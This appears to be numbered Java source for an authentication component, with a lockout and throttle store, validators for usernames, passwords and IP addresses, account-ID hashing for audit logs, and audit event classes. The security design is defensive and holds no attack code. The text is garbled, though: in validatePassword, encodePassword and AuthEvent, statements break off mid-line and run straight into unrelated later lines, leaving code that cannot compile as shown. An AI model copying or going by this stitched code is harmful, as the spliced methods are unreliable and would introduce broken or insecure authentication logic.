nowMillis));\n   188\t            }\n   189\t            return ALLOW;\n   190\t        }\n   191\t    }\n   192\t\n   193\t    /**\n   194\t     * Records a failed credential check against an account and returns whether the account is now\n   195\t     * locked. The increment and the lock decision happen in the same {@code compute} call, so two\n   196\t     * concurrent failures cannot both see \"one below the limit\" and let a third through.\n   197\t     */\n   198\t    Decision recordAccountFailure(String canonicalUsername, long nowMillis, int lockAfter, int lockSeconds) {\n   199\t        sweepIfDue(nowMillis);\n   200\t        List<Decision> observed = new ArrayList<>(1);\n   201\t        accounts.compute(canonicalUsername, (key, existing) -> {\n   202\t            AccountBucket bucket = existing;\n   203\t            if (bucket == null) {\n   204\t                if (accounts.size() >= MAX_ACCOUNT_KEYS && !evictIdleAccounts(nowMillis - lockSeconds * 2000L)) {\n   205\t                    observed.add(new Decision(Kind.BLOCKED, lockSeconds));\n   206\t                    return null;\n   207\t                }\n   208\t                bucket = new AccountBucket();\n   209\t            }\n   210\t            synchronized (bucket) {\n   211\t                bucket.lastTouchedMillis = nowMillis;\n   212\t                if (bucket.blockedUntilMillis > nowMillis) {\n   213\t                    observed.add(new Decision(Kind.LOCKED, secondsUntil(bucket.blockedUntilMillis, nowMillis)));\n   214\t                    return bucket;\n   215\t                }\n   216\t                bucket.consecutiveFailures++;\n   217\t                if (bucket.consecutiveFailures >= lockAfter) {\n   218\t                    bucket.blockedUntilMillis = nowMillis + lockSeconds * 1000L;\n   219\t                    bucket.consecutiveFailures = 0;\n   220\t                    observed.add(new Decision(Kind.LOCKED, lockSeconds));\n   221\t                    return bucket;\n   222\t                }\n   223\t                observed.add(ALLOW);\n   224\t                return bucket;\n   225\t            }\n   226\t        });\n   227\t        return observed.isEmpty() ? blockedForever() : observed.get(0);\n   228\t    }\n   229\t\n   230\t    /**\n   231\t     * Clears an account's failure state after a verified sign-in.\n   232\t     *\n   233\t     * <p>Clearing on success rather than on window expiry is what stops a lockout from being a\n   234\t     * permanent handle: an attacker cannot keep an account locked by generating failures around the\n   235\t     * owner's successful sign-ins, because the owner's success resets the streak.\n   236\t     */\n   237\t    void resetAccount(String canonicalUsername) {\n   238\t        accounts.computeIfPresent(canonicalUsername, (key, bucket) -> {\n   239\t            synchronized (bucket) {\n   240\t                bucket.consecutiveFailures = 0;\n   241\t                bucket.blockedUntilMillis = 0L;\n   242\t            }\n   243\t            return bucket;\n   244\t        });\n   245\t    }\n   246\t\n   247\t    /** Number of keys currently tracked; used by the deployment check and by tests. */\n   248\t    int trackedAccountKeys() {\n   249\t        return accounts.size();\n   250\t    }\n   251\t\n   252\t    int trackedSourceKeys() {\n   253\t        return sources.size();\n   254\t    }\n   255\t\n   256\t    /**\n   257\t     * Drops keys idle longer than the sweep horizon.\n   258\t     *\n   259\t     * <p>The clock passed in is the same one every verdict is computed from. Reading\n   260\t     * {@link System#currentTimeMillis()} here instead would compare the injected timeline against\n   261\t     * the wall clock: wherever the two differ - a test clock, or a deployment whose clock was stepped\n   262\t     * after buckets were created - the sweep would see every bucket as idle and delete the lockout\n   263\t     * state while authentication kept reporting healthy limits.\n   264\t     */\n   265\t    private void sweepIfDue(long nowMillis) {\n   266\t        long tick = operations.incrementAndGet();\n   267\t        if (tick % SWEEP_INTERVAL != 0) {\n   268\t            return;\n   269\t        }\n   270\t        long idleHorizon = nowMillis - SWEEP_INTERVAL_IDLE_MILLIS;\n   271\t        accounts.entrySet().removeIf(entry -> {\n   272\t            AccountBucket bucket = entry.getValue();\n   273\t            synchronized (bucket) {\n   274\t                return bucket.lastTouchedMillis < idleHorizon && bucket.blockedUntilMillis <= nowMillis;\n   275\t            }\n   276\t        });\n   277\t        sources.entrySet().removeIf(entry -> {\n   278\t            SourceBucket bucket = entry.getValue();\n   279\t            synchronized (bucket) {\n   280\t                // Stamps older than the longest window the configuration accepts can no longer\n   281\t                // affect any verdict, so they are dropped here. Without this a bucket keeps its\n   282\t                // stamps forever - and a bucket with stamps is never idle enough to sweep - so an\n   283\t                // attacker who spends {@code sourceMaxAttempts} attempts from each of\n   284\t                // {@code MAX_SOURCE_KEYS} addresses leaves the process holding every one of those\n   285\t                // timestamps permanently.\n   286\t                bucket.pruneStampsBefore(nowMillis - MAX_WINDOW_MILLIS);\n   287\t                return bucket.attempts.isEmpty() && bucket.blockedUntilMillis <= nowMillis\n   288\t                        && bucket.lastTouchedMillis < idleHorizon;\n   289\t            }\n   290\t        });\n   291\t    }\n   292\t\n   293\t    /**\n   294\t     * The longest per-source window the configuration bounds allow, plus a margin. Pruning at this\n   295\t     * horizon is always at least as generous as any legal {@code sourceWindowSeconds}, so it can\n   296\t     * never discard a stamp that a verdict would still have counted.\n   297\t     */\n   298\t    private static final long MAX_WINDOW_MILLIS = (AuthConfig.MAX_WINDOW_SECONDS + 300L) * 1000L;\n   299\t\n   300\t    /** Idle horizon: longer than the longest configurable window (one hour) plus margin. */\n   301\t    private static final long SWEEP_INTERVAL_IDLE_MILLIS = 90 * 60 * 1000L;\n   302\t\n   303\t    private boolean evictIdleAccounts(long horizon) {\n   304\t        int before = accounts.size();\n   305\t        accounts.entrySet().removeIf(entry -> {\n   306\t            AccountBucket bucket = entry.getValue();\n   307\t            synchronized (bucket) {\n   308\t                return bucket.lastTouchedMillis < horizon;\n   309\t            }\n   310\t        });\n   311\t        return accounts.size() < before;\n   312\t    }\n   313\t\n   314\t    private boolean evictIdleSources(long horizon) {\n   315\t        int before = sources.size();\n   316\t        sources.entrySet().removeIf(entry -> {\n   317\t            SourceBucket bucket = entry.getValue();\n   318\t            synchronized (bucket) {\n   319\t                return bucket.lastTouchedMillis < horizon;\n   320\t            }\n   321\t        });\n   322\t        return sources.size() < before;\n   323\t    }\n   324\t\n   325\t    /**\n   326\t     * Verdict when the tracking table is full and nothing could be evicted. Refusing is the only\n   327\t     * fail-closed answer: reporting \"allowed\" for an untracked key would make the cap a way to\n   328\t     * obtain unlimited attempts.\n   329\t     */\n   330\t    private static Decision blockedForever() {\n   331\t        return new Decision(Kind.BLOCKED, MAX_RETRY_AFTER_SECONDS);\n   332\t    }\n   333\t\n   334\t    /** Upper bound on the advertised retry hint, so it stays usable as a {@code Retry-After}. */\n   335\t    static final int MAX_RETRY_AFTER_SECONDS = 3600;\n   336\t\n   337\t    private static int secondsUntil(long untilMillis, long nowMillis) {\n   338\t        long delta = untilMillis - nowMillis;\n   339\t        if (delta <= 0) {\n   340\t            return 1;\n   341\t        }\n   342\t        long seconds = (delta + 999L) / 1000L;\n   343\t        return (int) Math.min(seconds, MAX_RETRY_AFTER_SECONDS);\n   344\t    }\n   345\t\n   346\t    private static final class AccountBucket {\n   347\t\n   348\t        private int consecutiveFailures;\n   349\t        private long blockedUntilMillis;\n   350\t        private long lastTouchedMillis = System.currentTimeMillis();\n   351\t\n   352\t        private AccountBucket() {\n   353\t        }\n   354\t    }\n   355\t\n   356\t    private static final class SourceBucket {\n   357\t\n   358\t        private final ArrayDeque<Long> attempts = new ArrayDeque<>();\n   359\t        private long blockedUntilMillis;\n   360\t        private long lastTouchedMillis = System.currentTimeMillis();\n   361\t\n   362\t        private SourceBucket() {\n   363\t        }\n   364\t\n   365\t        /** Drops stamps that no legal window could still count. Callers hold the bucket monitor. */\n   366\t        private void pruneStampsBefore(long horizon) {\n   367\t            while (!attempts.isEmpty() && attempts.peekFirst() < horizon) {\n   368\t                attempts.pollFirst();\n   369\t            }\n   370\t        }\n   371\t    }\n   372\t}\n     1\tpackage com.example.auth;\n     2\t\n     3\timport java.net.Inet4Address;\n     4\timport java.net.Inet6Address;\n     5\timport java.net.InetAddress;\n     6\timport java.net.UnknownHostException;\n     7\timport java.nio.ByteBuffer;\n     8\timport java.nio.CharBuffer;\n     9\timport java.nio.charset.CharsetEncoder;\n    10\timport java.nio.charset.CoderResult;\n    11\timport java.nio.charset.CodingErrorAction;\n    12\timport java.nio.charset.StandardCharsets;\n    13\timport java.util.ArrayList;\n    14\timport java.util.Collections;\n    15\timport java.util.List;\n    16\t\n    17\t/**\n    18\t * Textual input validation for the two client-controlled strings this component accepts.\n    19\t *\n    20\t * <p>Both checks are fail-closed: anything not explicitly allowed is rejected, there is no\n    21\t * normalisation that could fold two different inputs onto the same account, and no rejection ever\n    22\t * echoes the offending value.\n    23\t */\n    24\tpublic final class InputValidator {\n    25\t\n    26\t    /** Longest username accepted. */\n    27\t    public static final int MAX_USERNAME_CODEPOINTS = 64;\n    28\t\n    29\t    /**\n    30\t     * Shortest username accepted. Kept at two because length is not a security control here -- names\n    31\t     * are matched exactly, never folded -- so the validator refuses only the degenerate one-character\n    32\t     * form, which is what survives a truncated copy-paste and invites collisions during log review.\n    33\t     */\n    34\t    public static final int MIN_USERNAME_CODEPOINTS = 2;\n    35\t\n    36\t    /** Shortest password accepted. */\n    37\t    public static final int MIN_PASSWORD_CODEPOINTS = 10;\n    38\t\n    39\t    /** Longest password accepted. */\n    40\t    public static final int MAX_PASSWORD_CODEPOINTS = 256;\n    41\t\n    42\t    /** Longest source-address string accepted before parsing. */\n    43\t    public static final int MAX_SOURCE_ADDRESS_CHARS = 45;\n    44\t\n    45\t    private static final int MAX_UTF8_BYTES_PER_CODEPOINT = 4;\n    46\t\n    47\t    /**\n    48\t     * Ceiling on what {@link #encodePassword(char[])} will attempt, so the sizing arithmetic in that\n    49\t     * method cannot overflow an {@code int}. {@link #MAX_PASSWORD_CODEPOINTS} is far below it; the\n    50\t     * ceiling is what keeps the guarantee true for a caller that hands over a bigger buffer.\n    51\t     */\n    52\t    private static final int MAX_ENCODABLE_CHARS = 1 << 20;\n    53\t\n    54\t    private InputValidator() {\n    55\t    }\n    56\t\n    57\t    /**\n    58\t     * Parses a source address textually and returns its canonical form, or {@code null} when the\n    59\t     * value is not a bare IPv4/IPv6 literal.\n    60\t     *\n    61\t     * <p>Textual parsing is deliberate: {@link InetAddress#getByName(String)} is forbidden here\n    62\t     * because it resolves hostnames, and accepting a hostname would let a client rotate its address\n    63\t     * bucket by pointing additional DNS names at one host. The checks below reject every value the\n    64\t     * JDK would otherwise accept as a literal that is not a plain address, in particular:\n    65\t     * <ul>\n    66\t     *   <li>hostnames and anything else requiring resolution;</li>\n    67\t     *   <li>IPv6 zone identifiers ({@code fe80::1%eth0}) - the name after {@code %} is caller\n    68\t     *       chosen, so it would reintroduce hostnames and make buckets forgeable;</li>\n    69\t     *   <li>URL-looking values carrying a scheme, port, path or query;</li>\n    70\t     *   <li>bracketed forms ({@code [::1]}), surrounding whitespace, control characters, NUL.</li>\n    71\t     * </ul>\n    72\t     *\n    73\t     * <p>Remaining risk, documented in the README: raw literal addresses cannot distinguish\n    74\t     * clients behind one NAT gateway or behind a shared proxy, so the per-source budget is shared\n    75\t     * by everyone appearing to come from the same address. Deployments behind a proxy must pass the\n    76\t     * real client address; whatever that value is, it is still validated here before use.\n    77\t     */\n    78\t    public static String normalizeSourceAddress(String raw) {\n    79\t        String literalText = normalizeLiteralText(raw);\n    80\t        if (literalText == null) {\n    81\t            return null;\n    82\t        }\n    83\t        final InetAddress address;\n    84\t        try {\n    85\t            address = InetAddress.getByName(literalText);\n    86\t        } catch (UnknownHostException e) {\n    87\t            // getByName on a validated literal only fails for a malformed address.\n    88\t            return null;\n    89\t        }\n    90\t        if (!(address instanceof Inet4Address) && !(address instanceof Inet6Address)) {\n    91\t            return null;\n    92\t        }\n    93\t        return canonicalForm(address);\n    94\t    }\n    95\t\n    96\t    /**\n    97\t     * Purely textual check that {@code raw} is a bare IPv4 or IPv6 literal, and nothing else. No\n    98\t     * name resolution happens here.\n    99\t     */\n   100\t    private static String normalizeLiteralText(String raw) {\n   101\t        if (raw == null) {\n   102\t            return null;\n   103\t        }\n   104\t        if (raw.isEmpty() || raw.length() > MAX_SOURCE_ADDRESS_CHARS) {\n   105\t            return null;\n   106\t        }\n   107\t        for (int i = 0; i < raw.length(); i++) {\n   108\t            char c = raw.charAt(i);\n   109\t            // Control characters and spaces cannot appear in an address; '%', '/' and '@' are the\n   110\t            // zone-id, CIDR and userinfo forms that would either carry a caller-chosen name or\n   111\t            // describe a range rather than one host.\n   112\t            if (c <= 0x20 || c == 0x7f || c == '%' || c == '/' || c == '@' || c == '#') {\n   113\t                return null;\n   114\t            }\n   115\t        }\n   116\t        boolean v6 = raw.indexOf(':') >= 0;\n   117\t        if (v6) {\n   118\t            // A bare IPv6 literal contains only hex digits and colons, plus one embedded strict\n   119\t            // dotted quad as its tail (the IPv4-mapped form \"::ffff:203.0.113.7\" that dual-stack\n   120\t            // stacks and proxies emit for IPv4 peers). Nothing else may contain a dot, which keeps\n   121\t            // rejecting \"::1]\", \"[::1]\" and hostnames containing a colon.\n   122\t            int lastColon = raw.lastIndexOf(':');\n   123\t            if (raw.indexOf('.') >= 0) {\n   124\t                String head = raw.substring(0, lastColon + 1);\n   125\t                String tail = raw.substring(lastColon + 1);\n   126\t                if (!isStrictDottedQuad(tail)) {\n   127\t                    return null;\n   128\t                }\n   129\t                for (int i = 0; i < head.length(); i++) {\n   130\t                    char c = head.charAt(i);\n   131\t                    boolean allowed = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')\n   132\t                            || (c >= 'A' && c <= 'F') || c == ':';\n   133\t                    if (!allowed) {\n   134\t                        return null;\n   135\t                    }\n   136\t                }\n   137\t                if (countChar(head, ':') < 2) {\n   138\t                    return null;\n   139\t                }\n   140\t            } else {\n   141\t                for (int i = 0; i < raw.length(); i++) {\n   142\t                    char c = raw.charAt(i);\n   143\t                    boolean allowed = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F') || c == ':';\n   144\t                    if (!allowed) {\n   145\t                        return null;\n   146\t                    }\n   147\t                }\n   148\t            }\n   149\t            if (countChar(raw, ':') < 2) {\n   150\t                return null;\n   151\t            }\n   152\t        } else {\n   153\t            for (int i = 0; i < raw.length(); i++) {\n   154\t                char c = raw.charAt(i);\n   155\t                if ((c < '0' || c > '9') && c != '.') {\n   156\t                    return null;\n   157\t                }\n   158\t            }\n   159\t            if (countChar(raw, '.') != 3) {\n   160\t                return null;\n   161\t            }\n   162\t        }\n   163\t        // Java accepts IPv4 literals with fewer than four components (e.g. \"3232235777\" or\n   164\t        // \"127.1\"), which would silently fold several textual forms onto one bucket. Require the\n   165\t        // strict dotted-quad form with each octet 0-255 and no leading zeros.\n   166\t        if (!v6 && !isStrictDottedQuad(raw)) {\n   167\t            return null;\n   168\t        }\n   169\t        return raw;\n   170\t    }\n   171\t\n   172\t    /**\n   173\t     * Canonicalises the parsed address so that one host yields one throttle bucket. An IPv4 address\n   174\t     * submitted in the IPv4-mapped form ({@code ::ffff:203.0.113.7}, which is what a dual-stack stack\n   175\t     * reports for an IPv4 peer) must land in the same bucket as the dotted-quad spelling, so the\n   176\t     * mapped prefix is unwrapped. Nothing else is rewritten: {@code ::1} is an IPv6 loopback, not\n   177\t     * {@code 0.0.0.1}, and folding it would move a real host into another bucket.\n   178\t     */\n   179\t    private static String canonicalForm(InetAddress address) {\n   180\t        if (address instanceof Inet6Address) {\n   181\t            byte[] bytes = address.getAddress();\n   182\t            boolean ipv4Mapped = true;\n   183\t            for (int i = 0; i < 10; i++) {\n   184\t                if (bytes[i] != 0) {\n   185\t                    ipv4Mapped = false;\n   186\t                    break;\n   187\t                }\n   188\t            }\n   189\t            if (ipv4Mapped && bytes[10] == (byte) 0xff && bytes[11] == (byte) 0xff) {\n   190\t                try {\n   191\t                    address = InetAddress.getByAddress(\n   192\t                            new byte[] {bytes[12], bytes[13], bytes[14], bytes[15]});\n   193\t                } catch (UnknownHostException e) {\n   194\t                    return null;\n   195\t                }\n   196\t            }\n   197\t        }\n   198\t        String canonical = address.getHostAddress();\n   199\t        if (canonical == null || canonical.isEmpty()) {\n   200\t            return null;\n   201\t        }\n   202\t        // The canonical form must itself be re-acceptable; if it were not, an event line naming it\n   203\t        // would later be refused and the audit trail would be inconsistent with the decision.\n   204\t        if (!canonical.equals(normalizeLiteralText(canonical))) {\n   205\t            return null;\n   206\t        }\n   207\t        return canonical;\n   208\t    }\n   209\t\n   210\t    /**\n   211\t     * Validates a username. Returns the value unchanged on success, {@code null} on rejection.\n   212\t     *\n   213\t     * <p>Allowed: Unicode letters and decimal digits as {@link Character#isLetterOrDigit(int)}\n   214\t     * defines them, plus {@code . _ - @}. Rejected: empty, shorter than\n   215\t     * {@value #MIN_USERNAME_CODEPOINTS} or longer than {@value #MAX_USERNAME_CODEPOINTS} code points,\n   216\t     * a leading or trailing {@code .} or {@code -}, a trailing {@code _}, any {@code ..}, control\n   217\t     * characters, spaces, combining marks, emoji, and any code point outside the allowed set. A\n   218\t     * leading {@code _} is allowed: it is a common identifier prefix and, unlike {@code .} or\n   219\t     * {@code -}, is never a separator, so it cannot fold two different names onto one.\n   220\t     *\n   221\t     * <p>Deliberately absent: case folding and Unicode normalisation. They are what make\n   222\t     * {@code Admin} / {@code admin} and precomposed / decomposed names collide, so the comparison\n   223\t     * here is exact and byte-for-byte after validation.\n   224\t     *\n   225\t     * <p><b>What that does not do.</b> Because {@code isLetterOrDigit} is Unicode-wide, a name\n   226\t     * written in another script survives - a Cyrillic {@code U+0430} is not refused as a homoglyph\n   227\t     * of the Latin {@code U+0061}. No folding happens anywhere else either: the credential lookup,\n   228\t     * the throttle key and the logged account hash all compare ASCII case only, so a look-alike\n   229\t     * name is a <em>different</em> account with its own bucket and its own {@code account_id},\n   230\t     * never a way to reach or shadow someone else's. The exposure left over is a human one - two\n   231\t     * records in the operator's own file can look alike on screen - which is why names come from\n   232\t     * that file and not from self-service registration. Suite 1 pins both halves: that such a name\n   233\t     * is accepted, and that it never resolves to a Latin account.\n   234\t     */\n   235\t    public static String validateUsername(String raw) {\n   236\t        if (raw == null || raw.isEmpty()) {\n   237\t            return null;\n   238\t        }\n   239\t        if (raw.length() > MAX_USERNAME_CODEPOINTS * 2) {\n   240\t            return null;\n   241\t        }\n   242\t        if (!isAllowedUsernameText(raw)) {\n   243\t            return null;\n   244\t        }\n   245\t        int codePoints = raw.codePointCount(0, raw.length());\n   246\t        if (codePoints < MIN_USERNAME_CODEPOINTS || codePoints > MAX_USERNAME_CODEPOINTS) {\n   247\t            return null;\n   248\t        }\n   249\t        if (raw.indexOf(\"..\") >= 0) {\n   250\t            return null;\n   251\t        }\n   252\t        int first = raw.codePointAt(0);\n   253\t        if (!isLetterOrDigit(first) && first != '_') {\n   254\t            return null;\n   255\t        }\n   256\t        int last = raw.offsetByCodePoints(0, codePoints - 1);\n   257\t        if (!isLetterOrDigit(raw.codePointAt(last))) {\n   258\t            return null;\n   259\t        }\n   260\t        return raw;\n   261\t    }\n   262\t\n   263\t    /** Returns {@code true} when {@code candidate} is a username this validator accepts. */\n   264\t    public static boolean isValidUsername(String candidate) {\n   265\t        return validateUsername(candidate) != null;\n   266\t    }\n   267\t\n   268\t    /**\n   269\t     * Validates a password and returns a private copy of its characters. The caller's array is\n   270\t     * never retained, and the caller must wipe its own copy.\n   271\t     *\n   272\t     * <p>Rejects: {@code null}; any character below {@code U+0021} or exactly {@code U+007F}, checked\n   273\t     * before the length rules so a zero-filled buffer cannot qualify as a long-enough password;\n   274\t     * length outside {@value #MIN_PASSWORD_CODEPOINTS}..{@value #MAX_PASSWORD_CODEPOINTS} code points\n   275\t     * (so a trailing tab or NUL can never be silently stripped to reach a valid password, and no\n   276\t     * control character can inject a log record); unpaired surrogates; and any character that the\n   277\t     * required encoding cannot represent exactly.\n   278\t     *\n   279\t     * @throws AuthException with {@link Diagnostic#PASSWORD_ENCODING_UNSUPPORTED} when the value\n   280\t     *     contains code points that cannot survive the UTF-8 encoding used for hashing. Accepting\n   281\t     *     them would make two different passwords hash identically.\n   282\t     */\n   283\t    public static char[] validatePassword(char[] raw) throws AuthException {\n   284\t        if (raw == null) {\n   285\t            throw new AuthException(Diagnostic.PASSWORD_ENCODING_UNSUPPORTED);\n   286\t        }\n   287\t        if (raw.length == 0) {\n   288\t            throw new AuthException(Diagnostic.PASSWORD_TOO_SHORT);\n   289\t        }\n   290\t        // First, whatever the length: a single disallowed character anywhere makes the credential\n   291\t        // unusable, and scanning now is what stops an all-NUL buffer from being accepted on the\n   292\t        // strength of its size alone.\n   293\t        for (char c : raw) {\n   294\t            if (c < 0x21 || c == 0x7f) {\n   295\t                throw new AuthException(Diagnostic.PASSWORD_CONTROL_CHARACTER);\n   296\t            }\n   297\t        }\n   298\t        if (raw.length < MIN_PASSWORD_CODEPOINTS || raw.length > MAX_PASSWORD_CODEPOINTS * 2) {\n   299\t            throw new AuthException(Diagnostic.PASSWORD_TOO_SHORT);\n   300\t        }\n   301\t        int codePoints = 0;\n   302\t        for (int i = 0; This instead encodes straight out of\n   334\t     * the caller's {@code char[]} through a reporting {@link CharsetEncoder}, so a character the\n   335\t     * encoding cannot represent is <em>reported</em> rather than silently replaced, and every buffer\n   336\t     * that holds plaintext is a zeroed array.\n   337\t     *\n   338\t     * <p>The refusal matters for correctness, not only hygiene: {@link String#getBytes(java.nio.charset.Charset)}\n   339\t     * never throws, it substitutes {@code '?'}. Without the report, {@code \"caf\\u00e9\"} under a lossy\n   340\t     * encoding and a literal {@code \"caf?\"} produce the same digest and become interchangeable\n   341\t     * credentials. An unpaired surrogate is refused by the same mechanism.\n   342\t     *\n   343\t     * @throws AuthException when the value cannot be encoded byte-for-byte exactly\n   344\t     */\n   345\t    public static byte[] encodePassword(char[] raw) throws AuthException {\n   346\t        if (raw == null) {\n   347\t            throw new AuthException(Diagnostic.PASSWORD_ENCODING_UNSUPPORTED);\n   348\t        }\n   349\t        // Bounded so the sizing arithmetic below cannot overflow; far above any password this\n   350\t        // component accepts.\n   351\t        if (raw.length > 390\t    static List<String> immutableCopy(List<String> values) {\n   391\t        return Collections.unmodifiableList(new ArrayList<>(values));\n   392\t    }\n   393\t\n   394\t    private static What is written instead is\n    11\t * {@code account_id=<64 hex chars>} - the SHA-256 of the submitted name, ASCII-lower-cased - plus\n    12\t * {@code account_hint=<distinct-codepoint-count>} and {@code account_present=true|false}.\n    13\t *\n    14\t * <p>Why this is safe to keep:\n    15\t * <ul>\n    16\t *   <li>It is one-way. A log reader cannot recover the name, so a leaked log is not a list of\n    17\t *       accounts. The hash is <em>not</em> keyed: an offline dictionary of candidate names can be\n    18\t *       hashed and compared, which is why the README lists unsalted account identifiers as residual\n    19\t *       risk and why the field exists at all - the alternative is a log that cannot be searched.</li>\n    20\t *   <li>It is computed from the <em>submitted</em> text in every code path, so it never depends on\n    21\t *       the outcome of the check and cannot tell an attacker anything they can also learn from the\n    22\t *       response.</li>\n    23\t *   <li>Lower-casing makes {@code Alice} and {@code alice} the same identifier, matching the\n    24\t *       store's one-record-per-name rule.</li>\n    25\t *   <li>The hint is a number in {@code 0..32}, derived only from the submitted text; it exists so\n    26\t *       an operator can tell \"one account probed many times\" from \"many names probed once\" without\n    27\t *       storing the names.</li>\n    28\t * </ul>\n    29\t */\n    30\tfinal class AccountField {\n    31\t\n    32\t    private static final char[] HEX = \"0123456789abcdef\".toCharArray();\n    33\t\n    34\t    private AccountField() {\n    35\t    }\n    36\t\n    37\t    static String render(String submittedUsername, boolean present) {\n    38\t        return \"account_id=\" + accountId(submittedUsername)\n    39\t                + \" account_hint=\" + distinctCodePoints(submittedUsername)\n    40\t                + \" account_present=\" + (present ? \"true\" : \"false\");\n    41\t    }\n    42\t\n    43\t    static String accountId(String username) {\n    44\t        if (username == null) {\n    45\t            return repeat('0', 64);\n    46\t        }\n    47\t        byte[] canonical = lowerAscii(username).getBytes(StandardCharsets.UTF_8);\n    48\t        final byte[] digest;\n    49\t        try {\n    50\t            digest = MessageDigest.getInstance(\"SHA-256\").digest(canonical);\n    51\t        } catch (NoSuchAlgorithmException e) {\n    52\t            // SHA-256 is required of every conformant JRE; reaching this means the platform is\n    53\t            // broken and the attempt must not be logged with a guess.\n    54\t            throw new IllegalStateException(e);\n    55\t        }\n    56\t        char[] out = new char[digest.length * 2];\n    57\t        for (int i = 0; i < digest.length; i++) {\n    58\t            int b = digest[i] & 0xff;\n    59\t            out[i * 2] = HEX[b >>> 4];\n    60\t            out[i * 2 + 1] = HEX[b & 0x0f];\n    61\t        }\n    62\t        return new String(out);\n    63\t    }\n    64\t\n    65\t    /**\n    66\t     * Renders the size hint: how many <em>distinct</em> code points the submitted name used.\n    67\t     *\n    68\t     * <p>The set is a fixed 256-bit sketch rather than an exact set, so it saturates at 32 and two\n    69\t     * very different names can share a value. That is deliberate: the field exists to let a reviewer\n    70\t     * spot \"this name reuses one character 40 times\" without storing the name itself, and a\n    71\t     * collision loses nothing while an exact count would leak the alphabet of a name the log must\n    72\t     * not contain.\n    73\t     */\n    74\t    private static final int MAX_DISTINCT_CODE_POINT_HINT = 32;\n    75\t\n    76\t    static int distinctCodePoints(String username) {\n    77\t        if (username == null || username.isEmpty()) {\n    78\t            return 0;\n    79\t        }\n    80\t        int[] seen = new int[8];\n    81\t        int count = 0;\n    82\t        int length = username.length();\n    83\t        for (int i = 0; i < length;) {\n    84\t            int cp = username.codePointAt(i);\n    85\t            i += Character.charCount(cp);\n    86\t            int slot = (cp >>> 5) & 7;\n    87\t            int bit = cp & 31;\n    88\t            int mask = 1 << bit;\n    89\t            if ((seen[slot] & mask) != 0) {\n    90\t                continue;\n    91\t            }\n    92\t            seen[slot] |= mask;\n    93\t            count++;\n    94\t            if (count == MAX_DISTINCT_CODE_POINT_HINT) {\n    95\t                // Saturation, not truncation of the loop: a 40-character name and a 400-character\n    96\t                // name must not be distinguishable by this field.\n    97\t                return MAX_DISTINCT_CODE_POINT_HINT;\n    98\t            }\n    99\t        }\n   100\t        return count;\n   101\t    }\n   102\t\n   103\t    private static String lowerAscii(String value) {\n   104\t        StringBuilder out = new StringBuilder(value.length());\n   105\t        for (int i = 0; i < value.length(); i++) {\n   106\t            char c = value.charAt(i);\n   107\t            if (c >= 'A' && c <= 'Z') {\n   108\t                c = (char) (c + 32);\n   109\t            }\n   110\t            out.append(c);\n   111\t        }\n   112\t        return out.toString();\n   113\t    }\n   114\t\n   115\t    private static String repeat(char c, int times) {\n   116\t        char[] out = new char[times];\n   117\t        java.util.Arrays.fill(out, c);\n   118\t        return new String(out);\n   119\t    }\n   120\t}\n     1\tpackage com.example.auth;\n     2\t\n     3\t/**\n     4\t * Raised when an event could not be persisted.\n     5\t *\n     6\t * <p>The caller must treat authentication as failed. An event that is not durable is an\n     7\t * authentication decision that cannot be reviewed later, which is exactly the condition the log\n     8\t * exists to prevent, so the attempt is refused rather than allowed.\n     9\t *\n    10\t * <p>Like {@link AuthException}, this carries only a {@link Diagnostic} category. The suppressed\n    11\t * cause is deliberate: the underlying {@code IOException} message contains the log path, which must\n    12\t * not reach a caller.\n    13\t */\n    14\tfinal class AuditPersistenceException extends Exception {\n    15\t\n    16\t    private static final long serialVersionUID = 1L;\n    17\t\n    18\t    private final Diagnostic diagnostic;\n    19\t    private final AuthEvent event;\n    20\t\n    21\t    AuditPersistenceException(Diagnostic diagnostic) {\n    22\t        this(diagnostic, null);\n    23\t    }\n    24\t\n    25\t    /**\n    26\t     * @param event the event that could not be written, when the failure was about one specific\n    27\t     *     event. It is never rendered into this exception's message: only fields that are already\n    28\t     *     safe to record are offered back, so the alert replacing the event can keep the attribution\n    29\t     *     the event carried instead of reporting an unattributed error.\n    30\t     */\n    31\t    AuditPersistenceException(Diagnostic diagnostic, AuthEvent event) {\n    32\t        super(diagnostic.safeDetail(), null, false, false);\n    33\t        this.diagnostic = diagnostic;\n    34\t        this.event = event;\n    35\t    }\n    36\t\n    37\t    Diagnostic diagnostic() {\n    38\t        return diagnostic;\n    39\t    }\n    40\t\n    41\t    /** The unsaved event, or {@code null} when the failure was not about one specific event. */\n    42\t    AuthEvent unsavedEvent() {\n    43\t        return event;\n    44\t    }\n    45\t}\n     1\tpackage com.example.auth;\n     2\t\n     3\timport java.time.format.DateTimeFormatter;\n     4\timport java.time.format.DateTimeFormatterBuilder;\n     5\timport java.time.temporal.ChronoField;\n     6\timport java.util.regex.Pattern;\n     7\t\n     8\t/**\n     9\t * One authentication event, as retained for later review.\n    10\t *\n    11\t * <p>Immutable and constructed only from values that have already been validated, each rendered into\n    12\t * a fixed set of {@code key=value} fields. username itself (see {@link AccountField}).\n    18\t */\n    19\tfinal class AuthEvent {\n    20\t\n    21\t    /** Longest rendered line the logger will accept, enforced again by {@link AuditLogger}. */\n    22\t    static final int MAX_LINE_CHARS = 320;\n    23\t\n    24\t    private static final Pattern SOURCE_PATTERN = Pattern.compile(\n    25\t            \"^(?:[0-9]{1,3}(?:\\\\.[0-9]{1,3}){3}|[0-9A-Fa-f:]{2,45})$\");\n    26\t\n    27\t    private static final DateTimeFormatter TIMESTAMP = new DateTimeFormatterBuilder()\n    28\t            .appendInstant(6)\n    29\t            .toFormatter(java.util.Locale.ROOT);\n    30\t\n    31\t    private final long timestampMillis;\n    32\t    private final EventType type;\n    33\t    private    /**\n    72\t     * The source only if it is a form this component would have written in the first place. Used when\n    73\t     * re-reporting a rejected event as an alert: the alert must not reintroduce the value that caused\n    74\t     * the rejection.\n    75\t     */\n    76\t    String sourceIfSafe() {\n    77\t        if (source == null) {\n    78\t            return null;\n    79\t        }\n    80\t        if (!SOURCE_PATTERN.matcher(source).matches()) {\n    81\t            return null;\n    82\t        }\n    83\t        return source.equals(InputValidator.normalizeSourceAddress(source)) ? source : null;\n    84\t    }\n    85\t\n    86\t    /** The latency, or zero when it is outside the range this class would have rendered. */\n    87\t    long latencyMicrosIfSafe() {\n    88\t        return latencyMicros >= 0 && latencyMicros <= 3_600_000_000L ? latencyMicros : 0L;\n    89\t    }\n    90\t\n    91\t    /** The retry hint, or zero when it is outside the range this class would have rendered. */\n    92\t    int retryAfterSecondsIfSafe() 